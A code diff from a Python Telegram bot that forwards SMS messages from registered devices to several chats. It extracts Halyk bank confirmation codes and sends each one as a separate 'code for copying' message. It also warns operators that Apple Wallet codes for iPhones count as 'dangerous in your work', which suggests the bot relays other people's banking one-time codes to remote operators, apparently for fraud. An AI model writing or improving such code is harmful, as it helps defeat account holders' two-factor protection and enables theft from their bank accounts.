@@ -65,29 +65,6 @@ def extract_halyk_code(sender: str, message: str) -> Tuple[Optional[str], bool]:
     return code, is_apple
 
 
-def format_sms_message(sender: str, message: str) -> Tuple[str, Optional[str]]:
-    """
-    Форматировать SMS сообщение с учетом кодов Halyk
-    
-    Returns:
-        Tuple[formatted_message, warning]: (отформатированное сообщение, предупреждение или None)
-    """
-    code, is_apple = extract_halyk_code(sender, message)
-    
-    if code:
-        # Найден код от Halyk
-        formatted = message.replace(code, f'<code>{code}</code>', 1)
-        
-        warning = None
-        if is_apple:
-            warning = "⚠️ <b>ВНИМАНИЕ!</b> Это код для <b>iPhone</b> (Apple Wallet)!\n🚨 В вашей работе такие коды считаются опасными!"
-        
-        return formatted, warning
-    
-    # Обычное сообщение
-    return message, None
-
-
 async def _send_sms_notification_async(device_id: str, sender: str, message: str, timestamp: str):
     """Асинхронная отправка уведомления о SMS"""
     if not _bot:
@@ -105,27 +82,36 @@ async def _send_sms_notification_async(device_id: str, sender: str, message: str
         device = get_device_by_id(device_id)
         device_name = device.get('name', 'Неизвестное устройство') if device else device_id
         
-        # Форматируем сообщение с учетом кодов Halyk
-        formatted_message, warning = format_sms_message(sender, message)
+        # Проверяем, есть ли код от Halyk
+        code, is_apple = extract_halyk_code(sender, message)
         
-        # Базовое уведомление
+        # Базовое уведомление (БЕЗ форматирования кода в самом сообщении)
         notification = (
             f"📨 <b>Новое SMS</b>\n\n"
             f"<b>Устройство:</b> {device_name}\n"
             f"<b>От:</b> <code>{sender}</code>\n"
             f"<b>Время:</b> {timestamp}\n\n"
-            f"<b>Сообщение:</b>\n{formatted_message}"
+            f"<b>Сообщение:</b>\n{message}"
         )
-        
-        # Добавляем предупреждение, если это код для Apple
-        if warning:
-            notification += f"\n\n{warning}"
         
         # Отправляем уведомления во все чаты
         for chat_id in chat_ids:
             try:
+                # Отправляем основное сообщение
                 await _bot.send_message(chat_id, notification)
                 print(f"   ✅ SMS отправлено в Telegram чат {chat_id}")
+                
+                # Если есть код от Halyk - отправляем отдельным сообщением
+                if code:
+                    code_message = f"🔑 <b>Код для копирования:</b>\n<code>{code}</code>"
+                    
+                    # Добавляем предупреждение для Apple
+                    if is_apple:
+                        code_message += "\n\n⚠️ <b>ВНИМАНИЕ!</b> Это код для <b>iPhone</b> (Apple Wallet)!\n🚨 В вашей работе такие коды считаются опасными!"
+                    
+                    await _bot.send_message(chat_id, code_message)
+                    print(f"   ✅ Код отправлен отдельным сообщением в чат {chat_id}")
+                    
             except Exception as e:
                 print(f"   ❌ Ошибка отправки в чат {chat_id}: {e}")
     
